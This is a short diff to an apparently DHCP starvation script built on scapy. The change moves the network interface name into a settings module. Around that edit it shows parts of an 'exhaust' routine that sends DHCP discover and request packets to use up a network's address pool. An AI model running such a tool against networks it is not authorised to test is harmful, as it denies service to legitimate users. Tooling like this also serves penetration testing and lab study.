@@ -2,8 +2,8 @@
 
 from scapy.all import *
 from scapy.all import Ether, IP, UDP, BOOTP, DHCP
+import settings
 
-source_interface = "Ethernet"
 conf.checkIPaddr = False
 
 
@@ -33,7 +33,7 @@ def exhaust():
                         / BOOTP(op=1, chaddr=MAC_ADDR, xid=xid) \
                         / DHCP(options=[('message-type', 'discover'), ('end')])
 
-        offer = srp1(dhcp_discover, filter="port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
+        offer = srp1(dhcp_discover, filter="port 68 and port 67", iface=settings.source_interface, verbose=0, timeout=2)
 
         # SNIFF OFFER
         try:
@@ -54,7 +54,7 @@ def exhaust():
                                             ("server_id", offer_ser_id),
                                             "end"])
 
-            ack = srp1(dhcp_request, filter=f"src host {offer_ip} and port 68 and port 67", iface=source_interface, verbose=0, timeout=2)
+            ack = srp1(dhcp_request, filter=f"src host {offer_ip} and port 68 and port 67", iface=settings.source_interface, verbose=0, timeout=2)
             if ack != None:
                 error_ack = 0
                 print("ACK received\r", end = '')
